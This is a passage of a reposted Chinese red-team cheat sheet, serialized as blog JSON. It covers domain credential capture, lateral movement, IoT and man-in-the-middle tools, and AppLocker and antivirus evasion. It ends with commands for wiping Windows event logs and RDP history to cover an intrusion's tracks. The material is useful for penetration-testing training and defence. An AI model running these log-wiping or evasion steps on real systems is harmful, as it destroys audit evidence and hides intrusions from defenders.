id=\"TIPS\"><a href=\"#TIPS\" class=\"headerlink\" title=\"TIPS\"></a>TIPS</h4><p><a href=\"https://github.com/3gstudent/Dump-Clear-Password-after-KB2871997-installed\">《域渗透——Dump Clear-Text Password after KB2871997 installed》</a></p>\n<p><a href=\"http://www.vuln.cn/6812\">《域渗透——Hook PasswordChangeNotify》</a> </p>\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>可通过Hook PasswordChangeNotify实时记录域控管理员的新密码 </p></blockquote>\n<p><a href=\"http://www.liuhaihua.cn/archives/179102.html\">《域渗透——Local Administrator Password Solution》 </a></p>\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>域渗透时要记得留意域内主机的本地管理员账号 </p></blockquote>\n<p><a href=\"https://3gstudent.github.io/%E5%9F%9F%E6%B8%97%E9%80%8F-%E5%88%A9%E7%94%A8SYSVOL%E8%BF%98%E5%8E%9F%E7%BB%84%E7%AD%96%E7%95%A5%E4%B8%AD%E4%BF%9D%E5%AD%98%E7%9A%84%E5%AF%86%E7%A0%81\">《域渗透——利用SYSVOL还原组策略中保存的密码》 </a></p>\n<h4 id=\"相关工具\"><a href=\"#相关工具\" class=\"headerlink\" title=\"相关工具\"></a>相关工具</h4><ul>\n<li><p><a href=\"https://github.com/BloodHoundAD/BloodHound\">BloodHound </a></p>\n</li>\n<li><p><a href=\"https://github.com/byt3bl33d3r/CrackMapExec\">CrackMapExec </a></p>\n</li>\n<li><p><a href=\"https://github.com/byt3bl33d3r/DeathStar\">DeathStar</a> </p>\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>利用过程：<a href=\"http://www.freebuf.com/sectool/160884.html\">http://www.freebuf.com/sectool/160884.html</a></p></blockquote>\n</li>\n</ul>\n<h3 id=\"在远程系统上执行程序\"><a href=\"#在远程系统上执行程序\" class=\"headerlink\" title=\"在远程系统上执行程序\"></a>在远程系统上执行程序</h3><ul>\n<li>At </li>\n<li>Psexec </li>\n<li>WMIC </li>\n<li>Wmiexec </li>\n<li>Smbexec </li>\n<li>Powershell remoting </li>\n<li>DCOM </li>\n<li>Winrm (<a href=\"https://github.com/Hackplayers/evil-winrm\">https://github.com/Hackplayers/evil-winrm</a>)</li>\n</ul>\n<h3 id=\"IOT相关\"><a href=\"#IOT相关\" class=\"headerlink\" title=\"IOT相关\"></a>IOT相关</h3><ul>\n<li>1、路由器 <a href=\"https://github.com/reverse-shell/routersploit\">routersploit </a></li>\n<li>2、打印机 <a href=\"https://github.com/RUB-NDS/PRET\">PRET </a></li>\n<li>3、IOT exp <a href=\"https://www.exploitee.rs/\">https://www.exploitee.rs/</a></li>\n<li>4、相关<br><a href=\"https://www.owasp.org/index.php/OWASP_Nettacker\">OWASP-Nettacker</a><br><a href=\"https://github.com/dark-lbp/isf\">isf</a><br><a href=\"https://github.com/w3h/icsmaster\">icsmaster</a></li>\n</ul>\n<h3 id=\"中间人\"><a href=\"#中间人\" class=\"headerlink\" title=\"中间人\"></a>中间人</h3><ul>\n<li><a href=\"http://www.oxid.it/cain.html\">Cain</a> </li>\n<li><a href=\"https://github.com/Ettercap/ettercap\">Ettercap</a> </li>\n<li><a href=\"https://github.com/SpiderLabs/Responder\">Responder</a> </li>\n<li><a href=\"https://github.com/byt3bl33d3r/MITMf\">MITMf</a> </li>\n<li><a href=\"https://github.com/evilsocket/bettercap\">3r&#x2F;MITMf)</a></li>\n</ul>\n<h3 id=\"规避杀软及检测\"><a href=\"#规避杀软及检测\" class=\"headerlink\" title=\"规避杀软及检测\"></a>规避杀软及检测</h3><h4 id=\"Bypass-Applocker\"><a href=\"#Bypass-Applocker\" class=\"headerlink\" title=\"Bypass Applocker\"></a>Bypass Applocker</h4><p><a href=\"https://github.com/api0cradle/UltimateAppLockerByPassList\">UltimateAppLockerByPassList </a><br><a href=\"https://lolbas-project.github.io/\">https://lolbas-project.github.io/</a> </p>\n<h4 id=\"BypassAV\"><a href=\"#BypassAV\" class=\"headerlink\" title=\"BypassAV\"></a>BypassAV</h4><ul>\n<li>Empire </li>\n<li>PEspin </li>\n<li>Shellter </li>\n<li>Ebowla </li>\n<li>Veil </li>\n<li>PowerShell </li>\n<li>Python </li>\n<li><a href=\"http://www.4hou.com/technology/9379.html\">代码注入技术Process Doppelgänging </a></li>\n<li>…</li>\n</ul>\n<h2 id=\"痕迹清理\"><a href=\"#痕迹清理\" class=\"headerlink\" title=\"痕迹清理\"></a>痕迹清理</h2><h3 id=\"Windows日志清除\"><a href=\"#Windows日志清除\" class=\"headerlink\" title=\"Windows日志清除\"></a><a href=\"https://3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-Windows%E6%97%A5%E5%BF%97%E7%9A%84%E5%88%A0%E9%99%A4%E4%B8%8E%E7%BB%95%E8%BF%87\">Windows日志清除</a></h3><p>获取日志分类列表：</p>\n<div class=\"language-txt\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">txt</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #babed8\">wevtutil el &gt;1.txt</span></span></code></pre></div><p>获取单个日志类别的统计信息：<br>eg.</p>\n<div class=\"language-txt\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">txt</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #babed8\">wevtutil gli &quot;windows powershell&quot;</span></span></code></pre></div><p>回显：</p>\n<div class=\"language-txt\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">txt</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #babed8\">creationTime: 2016-11-28T06:01:37.986Z</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">lastAccessTime: 2016-11-28T06:01:37.986Z</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">lastWriteTime: 2017-08-08T08:01:20.979Z</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">fileSize: 1118208</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">attributes: 32</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">numberOfLogRecords: 1228</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">oldestRecordNumber: 1</span></span></code></pre></div><p>查看指定日志的具体内容：</p>\n<div class=\"language-txt\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">txt</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #babed8\">wevtutil qe /f:text &quot;windows powershell&quot;</span></span></code></pre></div><p>删除单个日志类别的所有信息：</p>\n<div class=\"language-txt\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">txt</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #babed8\">wevtutil cl &quot;windows powershell&quot;</span></span></code></pre></div><h3 id=\"破坏Windows日志记录功能\"><a href=\"#破坏Windows日志记录功能\" class=\"headerlink\" title=\"破坏Windows日志记录功能\"></a>破坏Windows日志记录功能</h3><p>利用工具 </p>\n<ul>\n<li><a href=\"https://github.com/hlldz/Invoke-Phant0m\">Invoke-Phant0m</a> </li>\n<li><a href=\"https://github.com/3gstudent/Windwos-EventLog-Bypass\">Windwos-EventLog-Bypass</a></li>\n</ul>\n<h3 id=\"Metasploit\"><a href=\"#Metasploit\" class=\"headerlink\" title=\"Metasploit\"></a>Metasploit</h3><div class=\"language-txt\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">txt</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #babed8\">run clearlogs </span></span></code></pre></div><div class=\"language-txt\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">txt</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #babed8\">clearev </span></span></code></pre></div><h3 id=\"3389登陆记录清除\"><a href=\"#3389登陆记录清除\" class=\"headerlink\" title=\"3389登陆记录清除\"></a>3389登陆记录清除</h3><div class=\"language-txt\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">txt</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #babed8\">@echo off</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">@reg delete &quot;HKEY_CURRENT_USER\\Software\\Microsoft\\Terminal Server Client\\Default&quot; /va /f</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">@del &quot;%USERPROFILE%\\My Documents\\Default.rdp&quot; /a</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">@exit</span></span></code></pre></div>","text":" Author: Evi1cg Blog: https://evi1cg.github.io 信息搜集开源情报信息收集（OSINT）github Github_...","permalink":"/post/转-知识点合集","photos":[],"count_time":{"symbolsCount":"39k","symbolsTime":"35 mins."},"categories":[],"tags":[],"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86\"><span class=\"toc-text\">信息搜集</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E5%BC%80%E6%BA%90%E6%83%85%E6%8A%A5%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%EF%BC%88OSINT%EF%BC%89\"><span class=\"toc-text\">开源情报信息收集（OSINT）</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#github\"><span class=\"toc-text\">github</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#whois%E6%9F%A5%E8%AF%A2-%E6%B3%A8%E5%86%8C%E4%BA%BA%E5%8F%8D%E6%9F%A5-%E9%82%AE%E7%AE%B1%E5%8F%8D%E6%9F%A5-%E7%9B%B8%E5%85%B3%E8%B5%84%E4%BA%A7\"><span class=\"toc-text\">whois查询&#x2F;注册人反查&#x2F;邮箱反查&#x2F;相关资产</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#google-hacking\"><span class=\"toc-text\">google hacking</span></a></li></ol></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E5%88%9B%E5%BB%BA%E4%BC%81%E4%B8%9A%E5%AF%86%E7%A0%81%E5%AD%97%E5%85%B8\"><span class=\"toc-text\">创建企业密码字典</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E5%AD%97%E5%85%B8%E5%88%97%E8%A1%A8\"><span class=\"toc-text\">字典列表</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E5%AF%86%E7%A0%81%E7%94%9F%E6%88%90\"><span class=\"toc-text\">密码生成</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E9%82%AE%E7%AE%B1%E5%88%97%E8%A1%A8%E8%8E%B7%E5%8F%96\"><span class=\"toc-text\">邮箱列表获取</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E6%B3%84%E9%9C%B2%E5%AF%86%E7%A0%81%E6%9F%A5%E8%AF%A2\"><span class=\"toc-text\">泄露密码查询</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E5%AF%B9%E4%BC%81%E4%B8%9A%E5%A4%96%E9%83%A8%E7%9B%B8%E5%85%B3%E4%BF%A1%E6%81%AF%E8%BF%9B%E8%A1%8C%E6%90%9C%E9%9B%86\"><span class=\"toc-text\">对企业外部相关信息进行搜集</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#%E5%AD%90%E5%9F%9F%E5%90%8D%E8%8E%B7%E5%8F%96\"><span class=\"toc-text\">子域名获取</span></a></li></ol></li></ol></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E8%BF%9B%E5%85%A5%E5%86%85%E7%BD%91\"><span class=\"toc-text\">进入内网</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E5%9F%BA%E4%BA%8E%E4%BC%81%E4%B8%9A%E5%BC%B1%E8%B4%A6%E5%8F%B7%E6%BC%8F%E6%B4%9E\"><span class=\"toc-text\">基于企业弱账号漏洞</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E5%9F%BA%E4%BA%8E%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E%E8%BF%9B%E5%85%A5\"><span class=\"toc-text\">基于系统漏洞进入</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E7%BD%91%E7%AB%99%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%B8%97%E9%80%8F\"><span class=\"toc-text\">网站应用程序渗透</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E6%97%A0%E7%BA%BFWi-Fi%E6%8E%A5%E5%85%A5\"><span class=\"toc-text\">无线Wi-Fi接入</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E9%9A%90%E5%8C%BF%E6%94%BB%E5%87%BB\"><span class=\"toc-text\">隐匿攻击</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#Command-and-Control\"><span class=\"toc-text\">Command and Control</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#Fronting\"><span class=\"toc-text\">Fronting</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E4%BB%A3%E7%90%86\"><span class=\"toc-text\">代理</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E5%86%85%E7%BD%91%E8%B7%A8%E8%BE%B9%E7%95%8C%E5%BA%94%E7%94%A8\"><span class=\"toc-text\">内网跨边界应用</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E5%86%85%E7%BD%91%E8%B7%A8%E8%BE%B9%E7%95%8C%E8%BD%AC%E5%8F%91\"><span class=\"toc-text\">内网跨边界转发</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E5%86%85%E7%BD%91%E8%B7%A8%E8%BE%B9%E7%95%8C%E4%BB%A3%E7%90%86%E7%A9%BF%E9%80%8F\"><span class=\"toc-text\">内网跨边界代理穿透</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#EW\"><span class=\"toc-text\">EW</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#Termite\"><span class=\"toc-text\">Termite</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E4%BB%A3%E7%90%86%E8%84%9A%E6%9C%AC\"><span class=\"toc-text\">代理脚本</span></a></li></ol></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#shell%E5%8F%8D%E5%BC%B9\"><span class=\"toc-text\">shell反弹</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E5%86%85%E7%BD%91%E6%96%87%E4%BB%B6%E7%9A%84%E4%BC%A0%E8%BE%93%E5%92%8C%E4%B8%8B%E8%BD%BD\"><span class=\"toc-text\">内网文件的传输和下载</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E6%90%AD%E5%BB%BA-HTTP-server\"><span class=\"toc-text\">搭建 HTTP server</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86\"><span class=\"toc-text\">内网信息搜集</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E6%9C%AC%E6%9C%BA%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86\"><span class=\"toc-text\">本机信息搜集</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#1%E3%80%81%E7%94%A8%E6%88%B7%E5%88%97%E8%A1%A8\"><span class=\"toc-text\">1、用户列表</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#2%E3%80%81%E8%BF%9B%E7%A8%8B%E5%88%97%E8%A1%A8\"><span class=\"toc-text\">2、进程列表</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#3%E3%80%81%E6%9C%8D%E5%8A%A1%E5%88%97%E8%A1%A8\"><span class=\"toc-text\">3、服务列表</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#4%E3%80%81%E7%AB%AF%E5%8F%A3%E5%88%97%E8%A1%A8\"><span class=\"toc-text\">4、端口列表</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#5%E3%80%81%E8%A1%A5%E4%B8%81%E5%88%97%E8%A1%A8\"><span class=\"toc-text\">5、补丁列表</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#6%E3%80%81%E6%9C%AC%E6%9C%BA%E5%85%B1%E4%BA%AB\"><span class=\"toc-text\">6、本机共享</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#7%E3%80%81%E6%9C%AC%E7%94%A8%E6%88%B7%E4%B9%A0%E6%83%AF%E5%88%86%E6%9E%90\"><span class=\"toc-text\">7、本用户习惯分析</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#8%E3%80%81%E8%8E%B7%E5%8F%96%E5%BD%93%E5%89%8D%E7%94%A8%E6%88%B7%E5%AF%86%E7%A0%81%E5%B7%A5%E5%85%B7\"><span class=\"toc-text\">8、获取当前用户密码工具</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#Windows\"><span class=\"toc-text\">Windows</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#Linux\"><span class=\"toc-text\">Linux</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#%E6%B5%8F%E8%A7%88%E5%99%A8\"><span class=\"toc-text\">浏览器</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#%E5%85%B6%E4%BB%96\"><span class=\"toc-text\">其他</span></a></li></ol></li></ol></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E6%89%A9%E6%95%A3%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86\"><span class=\"toc-text\">扩散信息收集</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F\"><span class=\"toc-text\">端口扫描</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#%E5%B8%B8%E7%94%A8%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7\"><span class=\"toc-text\">常用端口扫描工具</span></a></li></ol></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E5%86%85%E7%BD%91%E6%8B%93%E6%89%91%E6%9E%B6%E6%9E%84%E5%88%86%E6%9E%90\"><span class=\"toc-text\">内网拓扑架构分析</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E5%B8%B8%E8%A7%81%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%91%BD%E4%BB%A4\"><span class=\"toc-text\">常见信息收集命令</span></a></li></ol></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E7%AC%AC%E4%B8%89%E6%96%B9%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86\"><span class=\"toc-text\">第三方信息收集</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87\"><span class=\"toc-text\">权限提升</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#Windows-1\"><span class=\"toc-text\">Windows</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#BypassUAC\"><span class=\"toc-text\">BypassUAC</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#%E5%B8%B8%E7%94%A8%E6%96%B9%E6%B3%95\"><span class=\"toc-text\">常用方法</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#%E5%B8%B8%E7%94%A8%E5%B7%A5%E5%85%B7\"><span class=\"toc-text\">常用工具</span></a></li></ol></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E6%8F%90%E6%9D%83\"><span class=\"toc-text\">提权</span></a></li></ol></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#Linux-1\"><span class=\"toc-text\">Linux</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E5%86%85%E6%A0%B8%E6%BA%A2%E5%87%BA%E6%8F%90%E6%9D%83\"><span class=\"toc-text\">内核溢出提权</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1\"><span class=\"toc-text\">计划任务</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#SUID\"><span class=\"toc-text\">SUID</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E7%B3%BB%E7%BB%9F%E6%9C%8D%E5%8A%A1%E7%9A%84%E9%94%99%E8%AF%AF%E6%9D%83%E9%99%90%E9%85%8D%E7%BD%AE%E6%BC%8F%E6%B4%9E\"><span class=\"toc-text\">系统服务的错误权限配置漏洞</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84%E6%96%87%E4%BB%B6-%E6%96%87%E4%BB%B6%E5%A4%B9%E6%9D%83%E9%99%90%E9%85%8D%E7%BD%AE\"><span class=\"toc-text\">不安全的文件&#x2F;文件夹权限配置</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E6%89%BE%E5%AD%98%E5%82%A8%E7%9A%84%E6%98%8E%E6%96%87%E7%94%A8%E6%88%B7%E5%90%8D%EF%BC%8C%E5%AF%86%E7%A0%81\"><span class=\"toc-text\">找存储的明文用户名，密码</span></a></li></ol></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81\"><span 